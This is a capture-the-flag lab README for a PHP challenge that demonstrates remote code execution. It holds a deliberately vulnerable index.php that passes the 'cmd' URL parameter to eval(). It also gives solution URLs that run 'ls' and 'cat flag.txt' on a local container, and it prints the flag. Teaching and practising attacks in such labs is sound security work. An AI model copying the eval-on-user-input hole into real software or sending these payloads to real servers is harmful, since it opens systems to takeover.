# Challenge 5: ThinkAboutIt

## How to Start
```bash
docker compose pull
docker compose up -d
```

---

## Description
The purpose of this challenge is to demonstrate how **unsanitized commands from the URL** can allow an attacker to execute commands on the server.  
In this scenario, the user can execute system commands directly via a crafted URL.

---

## Solution
1. Access the browser and list the file system:
   ```
   http://localhost:8044/index.php?cmd=system('ls');
   ```
2. View the contents of the flag file:
   ```
   http://localhost:8044/index.php?cmd=system('cat flag.txt');
   ```

**Flag:**
```
flag{rce-php}
```

---

## How to Recreate

### 1. Create Folder Structure
Create a folder containing:
- `Dockerfile`
- `index.php`
- `flag.txt`

### 2. Dockerfile
```dockerfile
FROM php:7.4-apache

# Copy vulnerable PHP file and flag
COPY index.php /var/www/html/index.php
COPY flag.txt /var/www/html/flag.txt

# Enable Apache mod_rewrite just in case
RUN a2enmod rewrite
```

### 3. index.php
```php
<?php
// ⚠️ RCE vulnerability via eval()
if (isset($_GET['cmd'])) {
    eval($_GET['cmd']);
} else {
    echo "Try accessing ?cmd=... to test input.";
}
?>
```

### 4. flag.txt
```
flag{rce-php}
```

### 5. Build and Run
```bash
cd {rce-vuln directory}
docker build -t vuln-rce .
docker run -d -p 8044:80 vuln-rce
```

---

## Final Notes
This challenge highlights the **critical danger of Remote Code Execution (RCE)** vulnerabilities and the necessity of sanitizing and validating all user input.
